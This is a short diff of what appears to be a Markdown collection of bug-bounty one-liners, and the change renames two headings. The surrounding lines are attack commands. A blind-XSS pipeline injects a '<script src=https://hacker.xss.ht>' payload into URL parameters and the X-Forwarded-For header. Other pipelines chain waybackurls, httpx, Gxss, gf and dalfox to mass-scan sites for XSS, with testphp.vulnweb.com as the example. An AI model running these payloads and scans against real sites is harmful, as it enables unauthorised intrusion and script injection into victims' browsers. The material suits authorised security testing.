@@ -61,13 +61,13 @@ subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script 
 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
 ```
 
-## Gxss
+## Gxss with single target
 > @KathanP19
 ```bash
 echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
 ```
 
-## XSS using gf
+## XSS using gf with single target
 > @infosecMatter
 ```bash
 echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
